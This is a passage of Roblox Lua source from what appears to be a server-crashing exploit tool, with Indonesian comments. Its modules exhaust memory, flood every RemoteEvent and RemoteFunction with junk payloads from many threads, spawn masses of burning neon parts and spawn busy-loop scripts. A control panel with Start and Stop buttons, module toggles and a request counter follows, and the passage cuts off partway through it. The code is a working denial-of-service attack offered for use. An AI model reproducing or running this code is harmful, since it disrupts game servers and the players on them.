-- MODULE 2: MEMORY OVERLOAD
local function executeMemoryOverload(intensity)
    local memoryObjects = {}
    
    -- Create massive tables
    for i = 1, intensity * 1000 do
        local tableData = {}
        for j = 1, 100 do
            tableData[j] = string.rep("X", 1000)
        end
        table.insert(memoryObjects, tableData)
    end
    
    -- Create instances
    for i = 1, intensity * 500 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(100, 100, 100)
        part.Anchored = true
        part.CanCollide = false
        part.Transparency = 0.5
        part.Parent = workspace
        table.insert(memoryObjects, part)
    end
    
    return memoryObjects
end

-- MODULE 3: NETWORK OVERLOAD
local function executeNetworkOverload()
    -- Connection spam
    for i = 1, 1000 do
        pcall(function()
            workspace.Changed:Connect(function() end)
            game:GetService("RunService").Heartbeat:Connect(function() end)
        end)
    end
    
    -- Remote spam dengan berbagai signature
    local remotes = {}
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, obj)
        end
    end
    
    for i = 1, 20 do
        task.spawn(function()
            while AttackActive do
                for _, remote in pairs(remotes) do
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(
                                math.random(), 
                                string.rep("X", 1000),
                                Vector3.new(math.random(), math.random(), math.random()),
                                {data = string.rep("Y", 1000)}
                            )
                        else
                            remote:InvokeServer()
                        end
                        Stats.TotalRequests += 1
                    end)
                end
                task.wait()
            end
        end)
    end
end

-- MODULE 4: RENDER OVERLOAD
local function executeRenderOverload()
    local particles = {}
    
    for i = 1, 1000 do
        task.spawn(function()
            while AttackActive do
                local part = Instance.new("Part")
                part.Size = Vector3.new(5, 5, 5)
                part.Position = Vector3.new(
                    math.random(-500, 500),
                    math.random(10, 500),
                    math.random(-500, 500)
                )
                part.Material = Enum.Material.Neon
                part.Color = Color3.fromHSV(math.random(), 1, 1)
                part.Anchored = true
                part.CanCollide = false
                part.Parent = workspace
                
                local fire = Instance.new("Fire")
                fire.Parent = part
                fire.Size = 10
                fire.Heat = 10
                
                table.insert(particles, part)
                
                task.wait(0.01)
            end
        end)
    end
    
    return particles
end

-- MODULE 5: SCRIPT OVERLOAD
local function executeScriptOverload()
    for i = 1, 100 do
        task.spawn(function()
            local script = Instance.new("Script")
            script.Source = [[
                while true do
                    for i = 1, 10000 do
                        local x = math.sin(i) * math.cos(i)
                    end
                    task.wait()
                end
            ]]
            script.Parent = workspace
            script.Disabled = false
        end)
    end
end

-- MODULE 6: DATA OVERLOAD (Khusus game dengan DataStores)
local function executeDataOverload()
    if game:GetService("DataStoreService") then
        for i = 1, 50 do
            task.spawn(function()
                while AttackActive do
                    pcall(function()
                        local key = "Overload_"..math.random(1, 10000)
                        local data = {}
                        for j = 1, 100 do
                            data[j] = string.rep("DATA", 1000)
                        end
                        -- Simulasi data spam
                    end)
                    task.wait(0.1)
                end
            end)
        end
    end
end

-- ==================== CONTROL PANEL ====================
local function createControlPanel(parentFrame)
    local yOffset = 10
    
    -- Status Display
    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Parent = parentFrame
    StatusLabel.Position = UDim2.new(0, 10, 0, yOffset)
    StatusLabel.Size = UDim2.new(0.9, 0, 0, 60)
    StatusLabel.Text = "STATUS: READY\nRPS: 0\nREQUESTS: 0\nMEMORY: 0 MB"
    StatusLabel.TextColor3 = Color3.fromRGB(50, 200, 50)
    StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    StatusLabel.TextYAlignment = Enum.TextYAlignment.Top
    StatusLabel.Font = Enum.Font.Code
    
    yOffset += 70
    
    -- Attack Intensity
    local IntensityLabel = Instance.new("TextLabel")
    IntensityLabel.Parent = parentFrame
    IntensityLabel.Position = UDim2.new(0, 10, 0, yOffset)
    IntensityLabel.Size = UDim2.new(0.4, 0, 0, 20)
    IntensityLabel.Text = "Intensity:"
    
    local IntensitySlider = Instance.new("TextButton")
    IntensitySlider.Parent = parentFrame
    IntensitySlider.Position = UDim2.new(0.45, 0, 0, yOffset)
    IntensitySlider.Size = UDim2.new(0.5, -15, 0, 20)
    IntensitySlider.Text = "MEDIUM â–¾"
    IntensitySlider.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    
    yOffset += 30
    
    -- Module Selection
    local modules = {
        {name = "Remote Flood", enabled = true},
        {name = "Memory Overload", enabled = true},
        {name = "Network Spam", enabled = true},
        {name = "Render Overload", enabled = false},
        {name = "Script Injection", enabled = false},
        {name = "Data Overload", enabled = false}
    }
    
    for i, module in ipairs(modules) do
        local ModuleToggle = Instance.new("TextButton")
        ModuleToggle.Parent = parentFrame
        ModuleToggle.Position = UDim2.new(0.1, 0, 0, yOffset)
        ModuleToggle.Size = UDim2.new(0.8, 0, 0, 20)
        ModuleToggle.Text = (module.enabled and "âœ“ " or "âœ— ") .. module.name
        ModuleToggle.BackgroundColor3 = module.enabled and Color3.fromRGB(50, 100, 50) or Color3.fromRGB(100, 50, 50)
        yOffset += 25
    end
    
    yOffset += 10
    
    -- Master Control
    local StartButton = Instance.new("TextButton")
    StartButton.Parent = parentFrame
    StartButton.Position = UDim2.new(0.1, 0, 0, yOffset)
    StartButton.Size = UDim2.new(0.35, -5, 0, 30)
    StartButton.Text = "âš¡ START ALL"
    StartButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    
    local StopButton = Instance.new("TextButton")
    StopButton.Parent = parentFrame
    StopButton.Position = UDim2.new(0.55, 0, 0, yOffset)
    StopButton.Size = UDim2.new(0.35, -5, 0, 30)
    StopButton.Text = "â¹ï¸ STOP ALL"
